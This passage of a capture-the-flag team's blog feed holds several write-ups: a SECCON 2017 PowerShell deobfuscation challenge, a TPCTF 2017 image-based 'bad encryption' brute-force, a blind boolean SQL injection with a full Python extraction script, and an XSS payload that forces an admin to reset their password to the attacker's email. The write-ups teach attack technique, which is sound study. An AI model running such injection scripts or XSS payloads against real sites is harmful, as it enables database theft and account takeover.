<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</div><div class="line">	<span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</div><div class="line">	<span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</div><div class="line">	<span class="variable">$f</span>+=<span class="variable">$k</span>;</div><div class="line">	<span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</div><div class="line">		<span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</div><div class="line">		<span class="built_in">Write-Host</span> ([math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])).toString(),<span class="variable">$k</span></div><div class="line">		[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Each key of the piano corresponds to a number this is easy to discover without having to even look at the code, I just added a few prints in the loop and go through the executable and enter the correct key for the piano was <strong>hhjhhjhjkjhjhf</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/fXDeOab.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/fXDeOab.png" alt=""><br></a><br>The last phase is to decrypt that big base64 string with the key we got from the piano, once again we don’t even need to check the code just print the variable and you will get the last powershell script of the challenge.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$plain</span>=@()</div><div class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</div><div class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</div><div class="line">	<span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</div><div class="line">		<span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</div><div class="line">		<span class="variable">$i</span>++</div><div class="line">		<span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</div><div class="line">			<span class="variable">$j</span> = <span class="variable">$f</span>.length</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;)</div><div class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div><div class="line"><span class="built_in">Write-Host</span> iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div><div class="line"><span class="built_in">Read-Host</span> -Prompt <span class="string">"Press Enter to exit"</span></div></pre></td></tr></table></figure>
<p>Now we get another powershell script but the obfuscation on this one is real asking for a password:<br><a data-fancybox="gallery" href="https://i.imgur.com/AE3YVuy.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AE3YVuy.png" alt=""><br></a><br>Well it wasn’t very hard to me to reverse it, if you look closely there are alot of semicolons separating each variable assignment, for instance I checked one bye one variable and the one who looked interesting was the variable <code>{;}</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\root&gt; $&#123;;&#125;</div><div class="line">iex</div></pre></td></tr></table></figure>
<p><strong>iex</strong> is an invocation, for example it can be used to run a .ps1 file, if we look closely at the end of the script we can see a very big string (in green) which is being piped into <strong>iex</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/gsm6dOQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/gsm6dOQ.png" alt=""><br></a><br>if we copy that big string into the terminal we can see alot of <em>[char]number</em>, to easily convert them into text we can assign it into a variable and then call it and get the password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xJMeKxF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xJMeKxF.png" alt=""><br></a><br>As we can see the flag was the password! SECCON{P0wEr$H311}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Powerful_Shell&lt;br&gt;300 points&lt;br&gt;Powerful_Shell&lt;br&gt;&lt;br&gt;Crack me.&lt;br&gt;powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfc
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="seccon2017" scheme="https://teamrocketist.github.io/tags/seccon2017/"/>
    
      <category term="powershell" scheme="https://teamrocketist.github.io/tags/powershell/"/>
    
      <category term="obfuscation" scheme="https://teamrocketist.github.io/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] TPCTF2017 - Bad Encryption</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/</id>
    <published>2017-12-04T06:06:23.000Z</published>
    <updated>2017-12-04T06:18:01.701Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Bad Encryption<br>100<br><br>I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.<br><br>Author: Kevin Higgs<br><br></blockquote>

<p>We have a python program, which is little bit obfuscated with this horrible named variables:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    tel1l1l1l1l1l1l1lt = <span class="string">"REDACTED"</span></div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    l1l1l1l1l1l1l1l = getattr(builtins, <span class="string">"__import__"</span>)</div><div class="line">    l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(<span class="string">"PIL.Image"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(<span class="string">"RGB"</span>, (len(tel1l1l1l1l1l1l1lt), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load()</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l111l1l11 = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 <span class="keyword">in</span> tel1l1l1l1l1l1l1lt:</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/<span class="number">256</span>)</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,<span class="number">0</span>] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*<span class="number">10</span>))</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l111l1l11 += <span class="number">1</span></div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
<p>After fixing the code to be more readable I got this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    img = Image.new(<span class="string">"RGB"</span>, (len(flag), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    pixels = img.load()</div><div class="line">    counter = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> flag:</div><div class="line">        character = ord(character)</div><div class="line">        rand0 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand1 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand3 = (rand0/<span class="number">256</span>)</div><div class="line">        rand4 = (rand1/<span class="number">256</span>)</div><div class="line">        rand5 = character*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        pixels[counter,<span class="number">0</span>] = (rand0, rand1, round(rand6*<span class="number">10</span>))</div><div class="line">        counter += <span class="number">1</span></div><div class="line">    img.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
<p>We can see <code>rand0</code> and <code>rand1</code> are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate <code>round(rand6*10)</code> easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated:</p>
<p>The pseudo code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> character <span class="keyword">in</span> all_printable_characters:</div><div class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> image:</div><div class="line">        rand0 = pixel.red</div><div class="line">        rand1 = pixel.blue</div><div class="line">        rand3 = rand0/<span class="number">256</span></div><div class="line">        rand4 = rand1/<span class="number">256</span></div><div class="line">        rand5 = ord(character)*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        <span class="keyword">if</span> rand6 == pixel.blue:</div><div class="line">            flag += character</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>But we ran into a problem, as the description of the challenge says sometimes the <strong>encryption doesn’t work</strong> and one of the reasons is the calculations made by the <code>rand</code> variables can be <strong>above 255</strong> (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! </p>
<p>This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while <strong>multiple characters matches the same blue pixel</strong>, in these both cases we can’t know for sure if it is the character we want.</p>
<p>So my solution to this was to ignore all characters that were <strong>above 255</strong> and those that had <strong>multiple solutions</strong> to that <strong>byte position</strong> of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures.</p>
<p>The final python script I used was (note that using python3 in this challenge was absolutely necessary):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os, sys</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment"># flag size is 38</span></div><div class="line">flags = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    flag = []</div><div class="line">    im = Image.open(<span class="string">"out%d.png"</span>%i)</div><div class="line">    width = im.size[<span class="number">0</span>] <span class="comment">#define W and H</span></div><div class="line">    height = im.size[<span class="number">1</span>]</div><div class="line">    pix = im.load()</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,width):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        found = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> string.printable:</div><div class="line">            r,g,b = pix[x,<span class="number">0</span>]</div><div class="line">            rand0 = r</div><div class="line">            rand1 = g</div><div class="line">            rand3 = rand0/<span class="number">256</span></div><div class="line">            rand4 = rand1/<span class="number">256</span></div><div class="line">            rand5 = ord(character)*rand3</div><div class="line">            rand6 = rand5*rand4</div><div class="line">            <span class="keyword">if</span> round(rand6*<span class="number">10</span>) &gt;= <span class="number">255</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">if</span> round(rand6*<span class="number">10</span>) == b:</div><div class="line">                    found += <span class="number">1</span></div><div class="line">                    stop = <span class="keyword">False</span></div><div class="line">                    <span class="keyword">if</span> found == <span class="number">1</span>:</div><div class="line">                        flag.append(character)</div><div class="line">                    <span class="keyword">else</span>:</div><div class="line">                        flag[x] = <span class="string">'x'</span></div><div class="line">        <span class="keyword">if</span> stop:</div><div class="line">            flag.append(<span class="string">'x'</span>)</div><div class="line">    flags.append(<span class="string">''</span>.join(flag))</div><div class="line"></div><div class="line">final_flag = list(<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</div><div class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</div><div class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag):</div><div class="line">        <span class="keyword">if</span> c != <span class="string">'x'</span>: </div><div class="line">            final_flag[i] = c</div><div class="line"><span class="keyword">print</span> (<span class="string">''</span>.join(final_flag))</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python3 reverse.py</div><div class="line">tpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Bad Encryption&lt;br&gt;100&lt;br&gt;&lt;br&gt;I was making an encryption program, but it is far from perfect. Instead of make the encryption 
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
    
      <category term="python3" scheme="https://teamrocketist.github.io/tags/python3/"/>
    
  </entry>
  
  <entry>
    <title>[Web] TPCTF2017 - Management</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/</id>
    <published>2017-12-04T05:20:20.000Z</published>
    <updated>2017-12-04T05:43:19.986Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>

<p>Opening the website we can see we can choose the user:<br><a data-fancybox="gallery" href="https://i.imgur.com/z4dn6bc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/z4dn6bc.png" alt=""><br></a></p>
<p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</div></pre></td></tr></table></figure>
<p>It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
<p>It’s important to use <code>HEX</code> function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page <strong>Result: 1</strong> if it’s false it will return <strong>Result: 0</strong>, doing this by hand is tedious so I wrote a python script to automate the stuff:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">url=<span class="string">'http://52.90.229.46:8558'</span></div><div class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></div><div class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></div><div class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></div><div class="line"></div><div class="line">name = <span class="string">''</span></div><div class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</div><div class="line">    name = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</div><div class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></div><div class="line">            <span class="comment">#print PAYLOAD</span></div><div class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</div><div class="line">                <span class="comment">#print '-----------------------------------'</span></div><div class="line">                name += l</div><div class="line">                <span class="keyword">print</span> name</div><div class="line">                stop = <span class="keyword">False</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> stop:        </div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="comment">#if(1=1,sleep(6),0)</span></div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">$ python management.py </div><div class="line">f</div><div class="line">fl</div><div class="line">fla</div><div class="line">flag</div><div class="line">flag&#123;</div><div class="line">flag&#123;a</div><div class="line">flag&#123;aL</div><div class="line">flag&#123;aLW</div><div class="line">flag&#123;aLW4</div><div class="line">flag&#123;aLW4y</div><div class="line">flag&#123;aLW4ys</div><div class="line">flag&#123;aLW4ys_</div><div class="line">flag&#123;aLW4ys_E</div><div class="line">flag&#123;aLW4ys_ES</div><div class="line">flag&#123;aLW4ys_ESC</div><div class="line">flag&#123;aLW4ys_ESC4</div><div class="line">flag&#123;aLW4ys_ESC4P</div><div class="line">flag&#123;aLW4ys_ESC4PE</div><div class="line">flag&#123;aLW4ys_ESC4PE_</div><div class="line">flag&#123;aLW4ys_ESC4PE_3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3r</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rY</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYT</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1N</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Management&lt;br&gt;60&lt;br&gt;&lt;br&gt;I’ve created a new website so you can do all your important management. It includes users, creating 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="blindSqli" scheme="https://teamrocketist.github.io/tags/blindSqli/"/>
    
  </entry>
  
  <entry>
    <title>[Web] TPCTF2017 - It&#39;s Common Sense</title>
    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/"/>
    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/</id>
    <published>2017-12-04T04:35:42.000Z</published>
    <updated>2017-12-04T05:21:02.874Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>It’s Common Sense<br>100<br><br>Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.<br><br>We found this site: Common Sense Reviews<br><br>We think the site owners are related to Pirates. Please retrieve the admin password.<br><br>This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).<br><br>Author: Steven Su<br><br></blockquote>

<p>A XSS challenge, we do have a <strong>register form</strong> and a <strong>login page</strong>, after signing up we can visit two forms in the <strong>account page</strong>, one is to <strong>sent a review</strong> to the admin, and the other is to <strong>reset the password</strong> (the new password was send to the email submitted in the form).</p>
<p>My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a <strong>http only</strong> flag, which <strong>prevents</strong> it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to <strong>submit the password reset form</strong>! We can do this this with <strong>Ajax/Jquery</strong></p>
<p>The first line of the code is to import <code>Jquery</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">	$.ajax(&#123;</span></div><div class="line"><span class="javascript">	    type: <span class="string">"POST"</span>,</span></div><div class="line"><span class="javascript">	    url: <span class="string">"/account"</span>,</span></div><div class="line"><span class="javascript">	    data: <span class="string">'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request'</span>,</span></div><div class="line"><span class="javascript">	    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></div><div class="line"><span class="javascript">	        <span class="built_in">console</span>.log(<span class="string">'success'</span>);</span></div><div class="line"><span class="undefined">	    &#125;</span></div><div class="line"><span class="undefined">	&#125;);</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
